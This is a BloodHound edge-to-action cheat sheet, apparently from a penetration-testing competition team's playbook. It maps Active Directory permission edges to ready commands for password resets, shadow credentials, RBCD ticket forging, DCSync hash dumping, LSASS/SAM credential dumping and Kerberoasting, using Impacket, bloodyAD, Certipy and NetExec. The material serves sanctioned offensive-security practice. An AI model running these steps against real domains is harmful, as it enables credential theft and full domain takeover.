# BloodHound edge-to-action cheat sheet

> **Purpose:** turn a BloodHound attack path into executed steps under time pressure. Each edge in the graph is a *different* exploit with a *different* tool — the graph is the map, this is the turn-by-turn.
> **Scope:** standard, public AD tradecraft against known edges. This is for executing established techniques cleanly, which is the whole CPTC game.
> **Lives at:** `docs/playbook/bloodhound-edges.md`

## Before you touch an edge — the three things that got us stuck

1. **Read the edge, not just the path.** `GenericAll` on a *user* ≠ `GenericAll` on a *group* ≠ `GenericAll` on a *computer*. Same word, three different attacks. Right-click the edge in BloodHound → "Help" → Abuse Info; it gives the exact method for the version you're on.
2. **Collection gaps hide the real path.** If SharpHound ran with the wrong flags or at the wrong time, session-based edges (`HasSession`) are missing and the path you need is invisible. Re-collect when you get new access. See the collection checklist at the bottom.
3. **Pre-flight the environment.** Most "exploit didn't work" is friction: clock skew, wrong Impacket version, null-session blocked. Run the pre-flight (bottom) in the first 10 minutes.

## Common toolkit (pin versions during pre-flight)

- **Impacket** — `secretsdump`, `GetUserSPNs`, `GetNPUsers`, `getST`, `ntlmrelayx`, `dacledit`, `owneredit`, `addcomputer`
- **NetExec (nxc)** — spraying, exec, enumeration, session hunting
- **bloodyAD** — clean LDAP abuse of ACL edges (password resets, group adds, RBCD, shadow creds)
- **Certipy** — AD CS abuse + shadow credentials
- **pywhisker / PKINITtools** — shadow credentials (`msDS-KeyCredentialLink`) → TGT

> Command shapes below use placeholders: `DC` = domain controller host/IP, `DOMAIN` = FQDN, `user:pass` = your current creds, `TARGET` = the object the edge points at. Adjust to the engagement.

## The edges

### Control over a USER

| Edge | Means | Do this | Gotcha |
|---|---|---|---|
| `ForceChangePassword` | reset their password without knowing the old one | `bloodyAD --host DC -d DOMAIN -u user -p pass set password TARGET 'NewPass123!'` | resetting a password is **loud** and may break legit logins — note it for the report, prefer a shadow-cred/targeted-Kerberoast route if the account is in use |
| `GenericAll` / `GenericWrite` on a user | full/write control | shadow credentials (preferred, quiet): `certipy shadow auto -u user@DOMAIN -p pass -account TARGET` → gives you an NT hash/TGT. Or targeted Kerberoast: set a fake SPN, roast it, clear it | shadow creds need AD CS / a KDC that supports PKINIT; targeted Kerberoast needs the account's password to be crackable |

### Control over a GROUP

| Edge | Means | Do this | Gotcha |
|---|---|---|---|
| `GenericAll` / `GenericWrite` / `AddMember` / `AddSelf` on a group | add yourself to it | `bloodyAD --host DC -d DOMAIN -u user -p pass add groupMember TARGET user` | group membership for Kerberos tickets isn't re-read until you get a **fresh TGT** — re-authenticate after adding yourself, don't reuse the old ticket |

### Control over a COMPUTER

| Edge | Means | Do this | Gotcha |
|---|---|---|---|
| `GenericAll` / `GenericWrite` on a computer | take it over via RBCD or shadow creds | RBCD: `impacket-addcomputer` (add a fake computer if you can) → `bloodyAD ... add rbcd TARGET FAKECOMPUTER$` → `impacket-getST -spn cifs/TARGET -impersonate Administrator DOMAIN/FAKECOMPUTER$:pass` | needs `MachineAccountQuota > 0` to add a computer; if 0, use an existing account you control instead |
| `AllowedToAct` (RBCD already present) | impersonate any user to that host | `impacket-getST -spn cifs/TARGET -impersonate Administrator ...` then `secretsdump`/`psexec` with the ticket | watch Kerberos clock skew — sync to the DC first |

### ACL edges on ANY object

| Edge | Means | Do this | Gotcha |
|---|---|---|---|
| `WriteDacl` | grant yourself rights, then abuse them | `impacket-dacledit -action write -rights FullControl -principal user -target TARGET DOMAIN/user:pass` → now you have `GenericAll`, follow the matching row above | two-step: grant, *then* exploit. Clean up the ACL after for the report |
| `WriteOwner` | make yourself owner, then write the DACL | `impacket-owneredit -action write -new-owner user -target TARGET ...` → then `dacledit` as above | three-step chain; easy to lose track — write down each step as you go |
| `AddKeyCredentialLink` | shadow credentials | `certipy shadow auto -account TARGET -u user@DOMAIN -p pass` or `pywhisker` | needs a KDC supporting PKINIT (AD CS present). This is the quiet alternative to a password reset |

### Delegation

| Edge | Means | Do this | Gotcha |
|---|---|---|---|
| `AllowedToDelegate` (constrained) | impersonate users to a specific SPN | `impacket-getST -spn <allowed-spn> -impersonate Administrator DOMAIN/account:pass` | only works for the SPNs listed; protocol transition (`-self`) rules vary |
| `DCSync` (`GetChanges` + `GetChangesAll` on the domain) | pull every hash incl. krbtgt | `impacket-secretsdump -just-dc DOMAIN/user:pass@DC` | you need **both** GetChanges rights. krbtgt hash = golden ticket = game over; grab it and document, don't over-persist |

### "You already have access" edges

| Edge | Means | Do this | Gotcha |
|---|---|---|---|
| `AdminTo` | local admin on that host | `nxc smb TARGET -u user -p pass --sam --lsa` then `secretsdump`/dump LSASS | dumping creds may trip EDR — note detections for the report |
| `CanRDP` / `CanPSRemote` / `ExecuteDCOM` | lateral movement with current creds | `nxc rdp/winrm TARGET -u user -p pass -x 'cmd'` | needs valid creds for that host; confirm the session actually lands before moving on |
| `HasSession` | an admin is logged into a box you control | dump creds from that box to capture *their* token/hash | **collection-time only** — sessions are transient; the edge may be stale. Re-run SharpHound to confirm before relying on it |

### Roastable accounts (not edges, but BloodHound flags them)

| Flag | Do this | Gotcha |
|---|---|---|
| Kerberoastable (`HasSPN`) | `impacket-GetUserSPNs -request DOMAIN/user:pass -dc-ip DC` → crack offline (hashcat `-m 13100`) | only worth it if the service account password is weak; don't burn time cracking a 25-char password |
| AS-REP roastable (`DontReqPreAuth`) | `impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass` → crack (hashcat `-m 18200`) | needs the account list; works pre-auth so it's a cheap early win |

## SharpHound collection checklist

- Collect **all** methods, including sessions and ACLs: `SharpHound.exe -c All` (or `--collectionmethods All`).
- Loop session collection over time — admins log in and out; one snapshot misses `HasSession` edges. Re-run on a timer / after gaining new access.
- Run from a context that can read the DC (domain user is enough for most edges).
- Verify the zip actually imported: node/edge counts in BloodHound should be non-trivial. Empty-looking graph usually = collection ran in the wrong context.

## Pre-flight (first 10 minutes, every engagement)

- [ ] Sync clock to the DC: `sudo ntpdate DC` (or `rdate`/`chrony`). Kerberos fails on >5 min skew.
- [ ] Pin + smoke-test tools: `impacket-version`, `nxc --version`, `bloodyAD --help`, `certipy --version` all run.
- [ ] Confirm name resolution to the DC (add to `/etc/hosts` if DNS is flaky; Kerberos needs FQDNs).
- [ ] Faraday/Ghostwriter up; scope file loaded; roles assigned (recon / web / AD / pivot / scribe).
- [ ] Decide the **objective** first, then ask BloodHound for the shortest *achievable* path to it — not the globally shortest path.

## Reporting note

Every action above is a report finding. Capture evidence **at the moment of exploitation** (command + output + screenshot), tag it to the host, and log it to Ghostwriter then — not at hour eight. This is exactly what the custom tool's evidence board is being built to make frictionless.

In `siege`: after you execute an edge, advance the target host's state and draw the edge between the two hosts — type its BloodHound name (e.g. `AdminTo`) into the edge's "BloodHound edge" field and siege fills in an OS-aware abuse description automatically, so the graph on the TV shows the route you actually took.